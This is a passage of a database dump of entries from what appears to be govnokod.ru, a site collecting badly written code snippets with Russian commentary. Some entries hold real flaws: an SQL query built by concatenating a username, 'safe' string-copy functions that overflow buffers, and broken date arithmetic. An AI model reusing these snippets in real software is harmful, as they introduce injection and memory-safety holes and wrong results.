  (100,1093,4,1228927045,0,'@lib_001=(''A'',''G'',''C'',''T'',''A'');\r\n@lib_002=(''C'',''T'',''A'',''A'',''G'');\t\t \r\n@lib_003=(''T'',''G'',''C'',''A'',''T'');\r\n\r\n$string=<FILE>;\r\n@sequence=split(\"\",$string);\r\n@code=@sequence[-7..-3];\r\n\t\t\r\nif((join('''',@lib_001) eq join('''',@code)) or\r\n    (join('''',@lib_001[0..3]) eq join('''',@code[0..3])) or\r\n    (join('''',@lib_001[1..4]) eq join('''',@code[1..4])) or\r\n    (join('''',@lib_001[0,1,2,4]) eq join('''',@code[0,1,2,4])) or\r\n    (join('''',@lib_001[0,2,3,4]) eq join('''',@code[0,2,3,4])) or\r\n    (join('''',@lib_001[0,1,3,4]) eq join('''',@code[0,1,3,4]))) \r\n\t{$tag=join('''',@code);\r\n\t $closest_tag=join('''',@lib_001);}\r\n\t\t\t\r\nelsif((join('''',@lib_002) eq join('''',@code)) or\r\n     (join('''',@lib_002[0..3]) eq join('''',@code[0..3])) or\r\n     (join('''',@lib_002[1..4]) eq join('''',@code[1..4])) or\r\n     (join('''',@lib_002[0,1,2,4]) eq join('''',@code[0,1,2,4])) or\r\n     (join('''',@lib_002[0,2,3,4]) eq join('''',@code[0,2,3,4])) or\r\n     (join('''',@lib_002[0,1,3,4]) eq join('''',@code[0,1,3,4]))) \r\n\t{$tag=join('''',@code);\r\n\t $closest_tag=join('''',@lib_002);}\r\n\t\t\r\nelsif((join('''',@lib_003) eq join('''',@code)) or\r\n     (join('''',@lib_003[0..3]) eq join('''',@code[0..3])) or\r\n     (join('''',@lib_003[1..4]) eq join('''',@code[1..4])) or\r\n     (join('''',@lib_003[0,1,2,4]) eq join('''',@code[0,1,2,4])) or\r\n     (join('''',@lib_003[0,2,3,4]) eq join('''',@code[0,2,3,4])) or\r\n     (join('''',@lib_003[0,1,3,4]) eq join('''',@code[0,1,3,4]))) \r\n\t{$tag=join('''',@code);\r\n\t $closest_tag=join('''',@lib_003);}\r\n\r\nelse\r\n\t{$tag=join('''',@code);\r\n\t  $closest_tag=''NONE'';}','','',18,0,1,7),
  (101,1101,8,1228981614,1229420180,'private string parameterName;\r\n\r\npublic string ParameterName\r\n{\r\nget { return parameterName; }\r\nset { parameterName = value; }\r\n}','','И эта куча г... вместо: public string ParameterName {get; set;}',-38,0,0,12),
  (102,1110,8,1228995952,1231437765,'return Array.IndexOf<int>\r\n            (\r\n                Array.ConvertAll<object, int>\r\n                (\r\n                usedTemplates,\r\n                delegate(object o) { return (int)o; }\r\n                ),\r\n                templateID\r\n            )\r\n            >= 0;','','',-1,0,0,0),
  (103,1113,1,1228996146,0,'$g_db->q(\"SELECT * FROM {$GLOBAL[''db''][''pref'']}_volumes \r\n          WHERE `visible` != 0 AND `owner_id`={$duser[''u_id'']} \r\n          AND (`parent_volume`=0 OR `parent_volume`!=0)\"); //<-- Чёрная магия! Не редактировать!','','Без ТАКОГО последнего AND возвращает 0 строк :(',12,0,1,8),
  (104,1121,1,1228997293,0,'$result = doquery(\"SELECT * FROM {{table}} WHERE username=''\".$username.\"'';\",users,true);\r\n$username = $result[''username''];\r\nunset($result);','','В одной браузерной стратегии...',18,0,1,10),
  (105,1125,1,1228997734,0,'if ( strchr ( $_POST[\"ship$i\"], \"+\") || strchr($_POST[\"ship$i\"], \" \") || strchr($_POST[\"ship$i\"], \",\") || strchr($_POST[\"ship$i\"], \".\") || strchr($_POST[\"ship$i\"], \"-\") || strchr($_POST[\"ship$i\"], \"_\") || strchr($_POST[\"ship$i\"], \";\") || strchr($_POST[\"ship$i\"], \":\") ) { \r\nmessage(\"You got owned by >>The_Revenge Anticheat Systems<<\", \"Anticheat\");\r\n}\r\nif ( !strchr ( $_POST[\"ship$i\"], \"+\") && !strchr($_POST[\"ship$i\"], \" \") && !strchr($_POST[\"ship$i\"], \",\") && !strchr($_POST[\"ship$i\"], \".\") && !strchr($_POST[\"ship$i\"], \"-\") && !strchr($_POST[\"ship$i\"], \"_\") && !strchr($_POST[\"ship$i\"], \";\") && !strchr($_POST[\"ship$i\"], \":\")) {\r\n// код\r\n}','','Немец предложил такое решение для проверки, что в строке ship$i именно положительное целое число и ни что иное.\r\nВ другом месте попадается аналогичный момент, только там после каждого strchr для каждого спецсимвола идет 10 строк одного и того же кода с двумя запросами к БД и выдачей бана юзеру...\r\nПроект XNova (ogame-like)',12,0,1,2),
  (106,1127,8,1228997882,0,'protected string TryToUpper(string text)\r\n{\r\n      StringBuilder sb = new StringBuilder();\r\n      foreach(char t in text)\r\n      {\r\n      \ttry\r\n            {\r\n            \tsb.Append(t.ToString().ToUpper());\r\n            }\r\n            catch\r\n            {\r\n            \tsb.Append(t.ToString());\r\n            }\r\n      }\r\n      return sb.ToString();\r\n}','','',30,0,1,2),
  (107,1129,1,1228997912,0,'<?php }}}}}}} ?>','','Самое яркое впечатление от кода...',38,0,1,7),
  (108,1131,9,1228998152,0,'public static int daysBetween(Date startDate, Date endDate)\r\n{\r\n     int difInDays = (int) ((endDate.getTime() - startDate.getTime())/(1000*60*60*24));\r\n}','','Потрясающая воображение функция, которая считает разницу в днях между датами. Различие с правильным результатом в +\\- 1 день получается в 30% случаев...',9,0,1,4),
  (109,1141,1,1229000485,0,'$int = (int) $int;\r\nif (is_int($int)) { // на всякий случай\r\n   // ...\r\n}','','Идея где-то валяется в залежах башорга.',57,0,1,3),
  (110,1145,3,1229001164,0,'IF LTRIM(RTRIM(LEN(ISNULL(@MandantTags,'''')))) > 0\r\nBEGIN\r\n\tSET @TagsSQL = ''INSERT INTO #MandantTmp (...\r\nEND','','',12,0,1,0),
  (111,1154,2,1229003907,0,'if (a.length > 0){\r\n    if (a.length <> 0){\r\n        if (a.length == 7){\r\n            if (a.length === 7){\r\n                return a;\r\n            }\r\n        }\r\n    }\r\n}','','7 раз отмерь 1 отрежь',55,0,1,5),
  (113,1160,10,1229004767,0,'if (TableData = 1) or ((TableData = 2) and\r\n    (Pos(FieldDelim + ''Т_НАЦ'' + FieldDelim, OpArtFields) > 0)) then\r\n    sSelect := sSelect + '', '' + LMax + ''AR.Percent'' + R + '' AR_Percent'';\r\n  if (TableData = 1) or ((TableData = 2) and\r\n    (Pos(FieldDelim + ''Т_КАТ'' + FieldDelim, OpArtFields) > 0)) then\r\n    sSelect := sSelect + '', '' + LMax + ''AR.ID_ArtCat'' + R + '' AR_ID_ArtCat'';\r\n  if (TableData = 1) or ((TableData = 2) and\r\n    (Pos(FieldDelim + ''Т_ВЕС'' + FieldDelim, OpArtFields) > 0)) then\r\n    sSelect := sSelect + '', '' + LMax + ''AR.Weight'' + R + '' AR_Weight'';\r\n  if (TableData = 1) or ((TableData = 2) and\r\n    (Pos(FieldDelim + ''Т_ОБЪЕМ'' + FieldDelim, OpArtFields) > 0)) then\r\n    sSelect := sSelect + '', '' + LMax + ''AR.Capacity'' + R + '' AR_Capacity'';\r\n  if (TableData = 1) or ((TableData = 2) and\r\n    (Pos(FieldDelim + ''МИННАЦ'' + FieldDelim, OpArtFields) > 0)) then\r\n    sSelect := sSelect + '', '' + LMax + ''AR.MinDiscount'' + R + '' AR_MinDiscount'';\r\n  if (TableData = 1) or ((TableData = 2) and\r\n    (Pos(FieldDelim + ''Т_МИНКОЛ'' + FieldDelim, OpArtFields) > 0)) then\r\n    sSelect := sSelect + '', '' + LMax + ''AR.MinQuantity'' + R + '' AR_MinQuantity'';\r\n  if (TableData = 1) or ((TableData = 2) and\r\n    (Pos(FieldDelim + ''Т_СТАТУС'' + FieldDelim, OpArtFields) > 0)) then\r\n    sSelect := sSelect + '', '' + LMax + ''AR.Status'' + R + '' AR_Status'';\r\n  if (TableData = 1) or ((TableData = 2) and\r\n    (Pos(FieldDelim + ''Т_ГТД'' + FieldDelim, OpArtFields) > 0)) then\r\n    sSelect := sSelect + '', '' + LMax + ''AR.GTD'' + R + '' AR_GTD'';\r\n  if (TableData = 1) or ((TableData = 2) and\r\n    (Pos(FieldDelim + ''Т_СТРАНА'' + FieldDelim, OpArtFields) > 0)) then \r\n    sSelect := sSelect + '', '' + LMax + ''CO.Name'' + R + '' AR_Country'';','','Собирание SQL - запроса для выборки полей. И это маленький кусочек :)\r\nСерьёзная контора с миллиардными оборотами!',18,0,1,0),
  (114,1163,1,1229006659,0,'$result = $this->CachedRequest(600, $sirenaXml->Write(true) . '' '', $rxml);  // Никто никогда не поверит, зачем нужен пробел. ЧТОБЫ ВСЕ РАБОТАЛО! Магия.','','запрос в систему бронирования авиабилетов',0,0,1,1),
  (115,1165,1,1229007021,0,'//Вознашу хвалу тебе, о великий индуский бог программинга! Как ни странно, работает, но надо переписать на досуге.\r\n\t       \r\n$city_xml = $CityArray->GetXml(\"CityList\");\r\n\tforeach($city_xml as $tmp_array){\r\n\t\tif(!is_string($tmp_array) && $tmp_array[0] != \"\" && $tmp_array[0] != \"Success\" ){\r\n\t\t\tforeach($tmp_array as $second_array){\r\n\t\t\t\t$ixml = new xml();\r\n\t\t\t    \t$ixml->Insert($second_array);\r\n\t\t\t    \tforeach($ixml as $country_array){\r\n\t\t\t    \t\tif(!is_string($country_array) && $country_array[0] != \"\" && $country_array[0] != \"Success\" ){\r\n\t\t\t\t\t\tforeach($country_array as $rxml){\r\n\t\t\t\t\t\t\tif(!is_string($rxml)){\r\n\t\t\t\t\t\t\t\tforeach($rxml as $axml){\r\n\t\t\t\t\t\t\t\t\tif(!is_string($axml) && $axml[0] && $axml[0] != \"Position\"){\r\n\t\t\t\t\t\t\t\t\t\tforeach($axml as $bxml){\r\n\t\t\t\t\t\t\t\t\t\t\tforeach($bxml as $cxml){\r\n\t\t\t\t\t\t\t\t\t\t\t\tif(!is_string($cxml) && is_array($cxml) && $cxml[\"Name\"]){\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$cities[] = $cxml;\r\n\t\t\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t\t\t}\t\r\n\t\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t    \t}\r\n\t\t\t\t    }\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\nreturn $cities;','','Парсинг xml',24,0,1,1),
  (117,1176,8,1229078136,1230193386,'if (Monitor.TryEnter(this))\r\n            {\r\n                ...\r\n            }\r\n            else\r\n            {\r\n                // do not do anything\r\n            }','','',-3,0,0,4),
  (118,1178,3,1229078367,0,'CREATE OR REPLACE FUNCTION hex_inc(in_str character, n integer)\r\nRETURNS character AS\r\n$BODY$\r\nDECLARE x varchar;\r\nBEGIN\r\nx=in_str;\r\nif (substring(in_str from n for n+1)=''0'') or (substring(in_str from n for n+1)=''1'') or (substring(in_str from n for n+1)=''2'')\r\nor (substring(in_str from n for n+1)=''3'') or (substring(in_str from n for n+1)=''4'') or (substring(in_str from n for n+1)=''5'')\r\nor (substring(in_str from n for n+1)=''6'') or (substring(in_str from n for n+1)=''7'') or (substring(in_str from n for n+1)=''8'')\r\nor (substring(in_str from n for n+1)=''A'') or (substring(in_str from n for n+1)=''B'') or (substring(in_str from n for n+1)=''C'')\r\nor (substring(in_str from n for n+1)=''D'') or (substring(in_str from n for n+1)=''E'') THEN\r\nx=raplace_char(n,x,chr((ascii(substring(in_str from n for n+1))+1))); -- inc() только для string\r\nELSIF (substring(in_str from n for n+1)=''9'') THEN\r\nx=raplace_char(n,x,''A''); -- ну т.к. это уже 10\r\nELSIF (substring(in_str from n for n+1)=''F'') THEN\r\nx=raplace_char(n,x,''0''); -- ну т.к. это +1 разряд :)\r\nx=hex_inc(x,n-1);\r\nEND IF;\r\nRETURN x;\r\nEND;\r\n$BODY$\r\nLANGUAGE ''plpgsql'' VOLATILE\r\nCOST 100;\r\n\r\nCREATE OR REPLACE FUNCTION raplace_char(n integer, in_str character, in_char character)\r\nRETURNS character AS\r\n$BODY$\r\nBegin\r\nIF ( n = char_length(in_str) ) THEN\r\nRETURN substring(in_str from 1 for n-1) || in_char;\r\nELSIF (n = 1) THEN\r\nRETURN in_char || substring(in_str from 2 for char_length(in_str)-1) ;\r\nELSE\r\nRETURN substring(in_str from 1 for n-1) || in_char || substring(in_str from n+1 for char_length(in_str)-n);\r\nEND IF;\r\nEND;\r\n$BODY$\r\nLANGUAGE ''plpgsql'' STABLE\r\nCOST 100;','','Язык PL/PgSQL\r\nФункция должна делать inc числу, записанному в строке в шестнадцатеричном виде',10,0,1,0),
  (119,1185,7,1229078954,0,'#define private public','','',63,0,1,7),
  (120,1188,1,1229079451,0,'<?php echo \"Кру\"; ?>чу, <script>document.write(''вер'');</script><?php print(\"чу, \"); ?>запу<?php eval(\" ?>тать<?php \"); echo '' хочу''; ?>','','Защита от копирования ))))))',71,0,1,0),
  (121,1194,8,1229083006,1229420180,'clsLine L = Lines[4][i];\r\nint Ind = Lines[4].IndexOf(L);','','',-1,0,0,1),
  (122,1196,7,1229083809,0,'if ( g_nIdleState == 0 ) \r\n\t{\t// Initialize the splash screen right away\r\n\t\tif ( g_CurrentOptions.get_splash_screen() ) \r\n\t\t\tfgSplashInit();\r\n\t\tg_nIdleState++;\r\n    } \r\n\telse \r\n\t\tif ( g_nIdleState == 1 ) \r\n\t\t\tg_nIdleState++;\r\n\t\telse \r\n\t\t\tif ( g_nIdleState == 2 ) \r\n\t\t\t\tg_nIdleState++;\r\n\t\t\telse\r\n\t\t\t\tif ( g_nIdleState == 3 ) \r\n\t\t\t\t{\r\n\t\t\t\t\tif( !fgInitSubsystems()) \r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tFG_LOG(__FILE__, __LINE__,  FG_DK_GENERAL, FG_FALSE,   \"Subsystem initializations failed ...\" );\r\n\t\t\t\t\t\texit(-1);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tg_nIdleState++;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t\tif ( g_nIdleState == 4 ) \r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tfgInitVisuals();  // setup OpenGL view parameters\r\n\t\t\t\t\t\tg_nIdleState++;\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\tif ( g_nIdleState == 5 ) \r\n\t\t\t\t\t\t\tg_nIdleState++;\r\n\t\t\t\t\t\telse \r\n\t\t\t\t\t\t\tif ( g_nIdleState == 6 ) \r\n\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\tmark_time( &g_tsFrame );\r\n\t\t\t\t\t\t\t\tmark_time(&g_tsTime);\r\n\t\t\t\t\t\t\t\tg_nIdleState = 1000;\r\n\t\t\t\t\t\t\t} \r\n\r\n    if ( g_nIdleState == 1000 ) \r\n\t\tfgMainLoop();\r\n\telse \r\n\t\tif ( g_CurrentOptions.get_splash_screen() == 1 ) \r\n\t\t\tfgSplashUpdate(0.0);','','процесс загрузки и вывода сплэш-скрина и запуск основного рендера после этого (так предлагал делать flight gear в очень старой версии или чел, который ваял этот код, когда переделывал FG под нужды двигла, бугага)',2,0,1,0),
  (124,1204,1,1229086377,0,'// get today''s date string as YYYY-MM-DD HH:MM:SS\r\n\r\n   function getDateTime(){\r\n       $datetime = getdate();\r\n       $mday = $datetime[''mday''];\r\n       if ($mday<10){\r\n           $mday=\"0$mday\";\r\n       }\r\n       $mon = $datetime[''mon''];\r\n       if ($mon<10){\r\n           $mon=\"0$mon\";\r\n       }\r\n       $year = $datetime[''year''];\r\n       $mhour = $datetime[''hours''];\r\n       if ($mhour<10){\r\n           $mhour=\"0$mhour\";\r\n       }\r\n       $mmin = $datetime[''minutes''];\r\n       if ($mmin<10){\r\n           $mmin=\"0$mmin\";\r\n       }\r\n       $msec = $datetime[''seconds''];\r\n       if ($msec<10){\r\n           $msec=\"0$msec\";\r\n       }\r\n\r\n       $dateTime = \"$year-$mon-$mday $mhour:$mmin:$msec\";\r\n       return $dateTime;\r\n   }','','Китайский код самый беспощадный...',19,0,1,1),
  (125,1209,6,1229087498,0,'void safecpy(char *str1, char *str2)\r\n{\r\n\tstrncpy(str1, str2, strlen(str1));\r\n\tstr1[strlen[str1]] = 0;\r\n}\r\n\r\n...\r\n\r\nvoid safecpy(char *str1, char *str2)\r\n{\r\n\tstrncpy(str1, str2, sizeof(str1));\r\n\tstr1[sizeof(str1)] = 0;\r\n}','','Две примера функций \\\"безопасного\\\" копирования строк :-)',18,0,1,1),
  (126,1214,6,1229088225,1229420180,'int main ()\r\n{{{\r\n    \r\n    return 0;\r\n}}}','','Я любил делать так... От этого хуже работать не будет, но вызывает вопросительное выражение лица.',-1,0,0,1),
  (127,1217,7,1229088568,1229420180,'#define NULL 1','',':) Из той же оперы, что и http://govnokod.ru/62',-4,0,0,2),
  (128,1220,9,1229089081,0,'if (!account_number.equals(\"\") && cycleT != null) {\r\n    if (!account_number.equals(num)) {\r\n        doWrite(bufferedOut);\r\n        account_number = num;\r\n        cycleT = c;\r\n        vT = v;\r\n    } else if (!cycleT.equals(c)) {\r\n        doWrite(bufferedOut);\r\n        account_number = num;\r\n        cycleT = c;\r\n        vT = v;\r\n    } else if (vT != v) {\r\n        doWrite(bufferedOut);\r\n        account_number = num;\r\n        cycleT = c;\r\n        vT = v;\r\n    }\r\n} else {\r\n    account_number = num;\r\n    cycleT = c;\r\n    vT = v;\r\n}','','',7,0,1,0),
  (129,1223,8,1229089746,0,'try\r\n{\r\n    ...\r\n    if (obj == null)\r\n    {\r\n        LogManager.GetLogger(\"Log\").Warn(msg);\r\n        throw new SoapException(\"Object not found\", SoapException.ServerFaultCode);\r\n    }\r\n}\r\ncatch (Exception ex)\r\n{\r\n    LogManager.GetLogger(\"Log\").Error(msg, ex);\r\n    throw new SoapException(\"Object not found, SoapException.ServerFaultCode, ex);                \r\n}','','',10,0,1,1),
  (130,1227,5,1229091540,0,'try:\r\n    tray.pop_item(''Note'')\r\nexcept:\r\n    pass','','Этот код вытаскивает (вытаскивал) элемент из трея. На каждом кадре. %)',6,0,1,0),
  (131,1229,10,1229091563,1229420180,'if not MultiThread then\r\n  begin\r\n    GetName(@rec);\r\n    result:=rec.fname;\r\n  end\r\n  else\r\n  begin\r\n    hThread:=CreateThread(0,0,@GetName,@rec,0,tmp);\r\n    if WaitForSingleObject(hThread,100)=WAIT_TIMEOUT then\r\n      TerminateThread(hThread,0)\r\n    else\r\n      result:=rec.fname;\r\n    CloseHandle(hThread);\r\n  end;','','Дельфисты - ущербные люди......',-5,0,0,0),
  (133,1236,2,1229093110,0,'document.getElementById(element.id).checked = true;','','',34,0,1,6),
  (134,1241,13,1229095988,0,'Dim cr\r\n\r\nPrivate Function click()\r\nIf cr = 0 Then\r\ncr = 1\r\nclick = \"X\"\r\nElse\r\ncr = 0\r\nclick = \"O\"\r\nEnd If\r\nEnd Function\r\nPrivate Sub CommandButton1_Click()\r\nIf CommandButton1.Caption = \"\" Then CommandButton1.Caption = click()\r\nEnd Sub\r\n\r\nPrivate Sub CommandButton10_Click()\r\ncr = 0\r\n CommandButton1.Caption = \"\"\r\n CommandButton2.Caption = \"\"\r\n CommandButton3.Caption = \"\"\r\n CommandButton4.Caption = \"\"\r\n CommandButton5.Caption = \"\"\r\n CommandButton6.Caption = \"\"\r\n CommandButton7.Caption = \"\"\r\n CommandButton8.Caption = \"\"\r\n CommandButton9.Caption = \"\"\r\n \r\nEnd Sub\r\n\r\nPrivate Sub CommandButton2_Click()\r\nIf CommandButton2.Caption = \"\" Then CommandButton2.Caption = click()\r\n\r\nEnd Sub\r\n\r\nPrivate Sub CommandButton3_Click()\r\nIf CommandButton3.Caption = \"\" Then CommandButton3.Caption = click()\r\nEnd Sub\r\n\r\nPrivate Sub CommandButton4_Click()\r\nIf CommandButton4.Caption = \"\" Then CommandButton4.Caption = click()\r\nEnd Sub\r\n\r\nPrivate Sub CommandButton5_Click()\r\nIf CommandButton5.Caption = \"\" Then CommandButton5.Caption = click()\r\nEnd Sub\r\n\r\nPrivate Sub CommandButton6_Click()\r\nIf CommandButton6.Caption = \"\" Then CommandButton6.Caption = click()\r\nEnd Sub\r\n\r\nPrivate Sub CommandButton7_Click()\r\nIf CommandButton7.Caption = \"\" Then CommandButton7.Caption = click()\r\nEnd Sub\r\n\r\nPrivate Sub CommandButton8_Click()\r\nIf CommandButton8.Caption = \"\" Then CommandButton8.Caption = click()\r\nEnd Sub\r\n\r\nPrivate Sub CommandButton9_Click()\r\nIf CommandButton9.Caption = \"\" Then CommandButton9.Caption = click()\r\nEnd Sub','','Крестики-нолики на Power Point за 2 минуты.',11,0,1,3),
  (135,1244,11,1229096275,0,'z=1;\r\nb1.onRelease = function() {\r\n    if(xo1._alpha!=100){\r\n    z+=1;\r\n    if(z>2){z=1}\r\n        xo1._alpha=100;\r\n    xo1.gotoAndStop(z);}\r\n};\r\n\r\nb2.onRelease = function() {\r\n    if(xo2._alpha!=100){\r\n    z+=1;\r\n    if(z>2){z=1}\r\n        xo2._alpha=100;\r\n    xo2.gotoAndStop(z);}\r\n};\r\n\r\nb3.onRelease = function() {\r\n    if(xo3._alpha!=100){\r\n    z+=1;\r\n    if(z>2){z=1}\r\n        xo3._alpha=100;\r\n    xo3.gotoAndStop(z);}\r\n};\r\n\r\nb4.onRelease = function() {\r\n    if(xo4._alpha!=100){\r\n    z+=1;\r\n    if(z>2){z=1}\r\n        xo4._alpha=100;\r\n    xo4.gotoAndStop(z);}\r\n};\r\n\r\nb5.onRelease = function() {\r\n    if(xo5._alpha!=100){\r\n    z+=1;\r\n    if(z>2){z=1}\r\n        xo5._alpha=100;\r\n    xo5.gotoAndStop(z);}\r\n};\r\n\r\nb6.onRelease = function() {\r\n    if(xo6._alpha!=100){\r\n    z+=1;\r\n    if(z>2){z=1}\r\n        xo6._alpha=100;\r\n    xo6.gotoAndStop(z);}\r\n};\r\n\r\nb7.onRelease = function() {\r\n    if(xo7._alpha!=100){\r\n    z+=1;\r\n    if(z>2){z=1}\r\n        xo7._alpha=100;\r\n    xo7.gotoAndStop(z);}\r\n};\r\n\r\nb8.onRelease = function() {\r\n    if(xo8._alpha!=100){\r\n    z+=1;\r\n    if(z>2){z=1}\r\n        xo8._alpha=100;\r\n    xo8.gotoAndStop(z);}\r\n};\r\n\r\nb9.onRelease = function() {\r\n    if(xo9._alpha!=100){\r\n    z+=1;\r\n    if(z>2){z=1}\r\n        xo9._alpha=100;\r\n    xo9.gotoAndStop(z);}\r\n};','','Интерфейс крестиков-ноликов на флеше, AS.',7,0,1,0),
  (136,1248,11,1229097028,0,'//_domain = url.match(/http\\:\\/\\/(.*?)\\/.*/is)[1]; не работает с https\r\n_domain =  url.substr(url.indexOf(\"://\")+3).substr(0,url.substr(url.indexOf(\"://\")+3).indexOf(\"/\"));','','не работает никак',9,0,1,0),
  (137,1251,1,1229098402,0,'$year=date(''y'');\r\n$y=date(''Y'');\r\n$month=date(''M'');\r\n$day=date(''d'');\r\n$dayofmonth=date(''D'');\r\nprint \"Today is $day $month $y, $dayofmonth.\";\r\n\r\nif($month==\"Apr\" || $month==\"Jun\" || $month==\"Sep\" || $month==\"Nov\")\r\n{ $maxday=30; }\r\nelse if($month==\"Feb\") \r\n{ if($year % 4) { $maxday=28; } else { $maxday=29; } }\r\nelse \r\n{ $maxday=31; }\r\n\r\n#print \"Current month consist of $maxday days.\\n\";\r\n\r\n#Для высокосных годов\r\n\r\nif($year==\"04\" || $year==\"32\" | $year==\"60\" || $year==\"88\")\r\n{ if($month==\"Jan\" || $month==\"Apr\" || $month==\"Jul\")\r\n  { $fd=4; }\r\n  else if($month==\"Feb\" || $month==\"Avg\")\r\n  { $fd=0; }\r\n  else if($month==\"Mar\" || $month==\"Nov\")\r\n  { $fd=1; }\r\n  else if($month==\"May\")\r\n  { $fd=6; }\r\n  else if($month==\"Jul\")\r\n  { $fd=2; }\r\n  else if($month==\"Sep\" || $month==\"Dec\")\r\n  { $fd=3; }\r\n  else if($month==\"Oct\")\r\n  { $fd=5; }\r\n}\r\n\r\n// и так далее :)','','Реализация календаря :)',5,0,1,3),
  (138,1253,4,1229098593,0,'sub pfexec { args \"pfexec\", @_ unless $1.$2 eq \"pfexec\";\r\n  local ( $_, $lp, @rep ) = @_; $lp ||= 1;\r\n  die ''Command string must not contain $$ sequences'' if m/\\$\\$/o;\r\n  1 while s/\\(([^()]*)\\)/''$$''.push(@rep,$1)/eo;\r\n# print $_,\"REP:\\n\",\"=>\",join( \"\\n=>\", @rep),\"\\n\";\r\n  unshift @rep, \"\"; s/\\s+/ /g;\r\n\r\nLOOP: while ( $lp-- ) {\r\n        foreach ( split \";\" ){\r\n          my @cmd = split \" \"; $_ = shift @cmd; last unless m/^(\\w{2})(\\w+)/o;\r\nCMD:  foreach (@cmd){\r\n                1 while s/\\$\\$(\\d+)/''(''.$rep[$1].'')''/eo; s/^\\(\\s*(.*?)\\s*\\)$/$1/so;\r\n                s/^\\%(\\d+)->(\\w+)=//    and ${$HASH[$1]} ->{$2} = $_ and next;\r\n                /^\\%(\\d+)->(\\w+)/               and $_ = ${$HASH[$1]} ->{$2} and redo CMD;\r\n\r\n                /^%%(\\d+)/      and $_ = $HASH[$1] || ( $HASH[$1] = \\{} ) and next;\r\n                /^\\%(\\d+)/      and $_ = ${$HASH[$1]} and next;\r\n                /^\\#\\#(\\d+)/ and $_ = $CHAN[$1] || ( $CHAN[$1] = \\{} ) and next;\r\n                /^\\#(\\d+)/      and $_ = ${$CHAN[$1]} and next;\r\n          }\r\n          $_ = $::control{$1} && $::control{$1}{$2};\r\n          s/\\^(\\d+)/$cmd[$1-1]/geo and print \"Expanded to: $_\\n\"\r\n                and pfexec( $_ ) if !ref;\r\n          args $1.$2, @cmd and eval { $_->(@cmd) } if \"CODE\" eq ref;\r\n          last LOOP if $@;\r\n        }\r\n  }','','Так пишет мой коллега',12,0,1,3),
  (139,1255,2,1229099972,0,'<script>\r\nvar InternetExplorer = navigator.appName.indexOf(«Microsoft») != -1;\r\nvar ie = 0;\r\nif (InternetExplorer) { var ie=1 }\r\n</script>','','проверка ИЕ.',20,0,1,0),
  (140,1257,1,1229100164,0,'echo “<select id=\\”seltel[\".$i.\"]\\”>”;\r\nswitch ($data2[\"PHONE\"][$i][\"type\"]) {\r\ncase “Факс”:\r\necho “<option selected>Факс”;\r\necho “<option>Офисный телефон”;\r\necho “<option>Колцентр”;\r\necho “<option>Телефон”;\r\necho “<option>Мобильный телефон”;\r\nbreak;\r\ncase “Офисный телефон”:\r\necho “<option>Факс”;\r\necho “<option selected>Офисный телефон”;\r\necho “<option>Колцентр”;\r\necho “<option>Телефон”;\r\necho “<option>Мобильный телефон”;\r\nbreak;\r\ncase “Колцентр”:\r\necho “<option>Факс”;\r\necho “<option>Офисный телефон”;\r\necho “<option selected>Колцентр”;\r\necho “<option>Телефон”;\r\necho “<option>Мобильный телефон”;\r\nbreak;\r\ncase “Телефон”:\r\necho “<option>Факс”;\r\necho “<option>Офисный телефон”;\r\necho “<option>Колцентр”;\r\necho “<option selected>Телефон”;\r\necho “<option>Мобильный телефон”;\r\nbreak;\r\ncase “Мобильный телефон”:\r\necho “<option>Факс”;\r\necho “<option>Офисный телефон”;\r\necho “<option>Колцентр”;\r\necho “<option>Телефон”;\r\necho “<option selected>Мобильный телефон”;\r\nbreak;\r\n};\r\necho “</select><br/>”;','','вот как надо создавать выпадающие списки!',54,0,1,6),
  (141,1261,1,1229100791,0,'if (isset($param) && $param!=null && $param!=0 && $param>1) {\r\n  sendRequest($param);\r\n}','','',41,0,1,3),
  (142,1268,7,1229104208,0,'try{\r\n   memcpy(pbSourceData, pbDestData + sizeof(tc_version) + sizeof(dwSenderNameLen) + dwSenderNameLen, key_len);\r\n}\r\ncatch(...) {\r\n   ret = EX_ERROR;\r\n   goto err;\r\n}\r\n\r\ntry{\r\n   memcpy(pbKeyData, pbSignData + sizeof(tc_version) + sizeof(dwSenderTPLen) + dwSenderTPLen, key_len);\r\n}\r\ncatch(...) {\r\n   ret = EX_ERROR;\r\n   goto err;\r\n}','','Аналогичные куски повторяются раз 10 друг за другом с другими переменными.',13,0,1,5),
  (143,1279,2,1229114331,0,'var req_date = document.getElementById(''requested_date'').value.split(''-'');\r\nif (req_date.length!=3 || new Number(req_date[0])<1990 || new Number(req_date[0])>2100\r\n|| new Number(req_date[1])<1 || new Number(req_date[1])>12 || new Number(req_date[2])<1) {\r\nalert(''Requested date is not valid, please re-enter.'');\r\nreturn false;\r\n}\r\n\r\nvar ef_date = document.getElementById(''effective_date'').value.split(''-'');\r\nif (ef_date.length!=3 || new Number(ef_date[0])<1990 || new Number(ef_date[0])>2100\r\n|| new Number(ef_date[1])<1 || new Number(ef_date[1])>12 || new Number(ef_date[2])<1) {\r\nalert(''Effective date is not valid, please re-enter.'');\r\nreturn false;\r\n}\r\n\r\nvar ex_date = document.getElementById(''expiration_date'').value.split(''-'');\r\nif (ex_date.length!=3 || new Number(ex_date[0])<1990 || new Number(ex_date[0])>2100\r\n|| new Number(ex_date[1])<1 || new Number(ex_date[1])>12 || new Number(ex_date[2])<1) {\r\nalert(''Expiration date is not valid, please re-enter.'');\r\nreturn false;\r\n}\r\n\r\n\r\n        var month_days = new Array(31,29,31,30,31,30,31,31,30,31,30,31);\r\n\r\nif (new Number(req_date[0])%4) {\r\nmonth_days[1] = 28;\r\n}\r\n\r\nif ((new Number(req_date[2])>month_days[new Number(req_date[1])-1]) ) {\r\nalert(''Requested date is not valid, please re-enter.'');\r\nreturn false;\r\n}\r\n\r\nif (new Number(ef_date[0])%4) {\r\nmonth_days[1] = 28;\r\n}\r\nif ((new Number(ef_date[2])>month_days[new Number(ef_date[1])-1]) ) {\r\nalert(''Effective 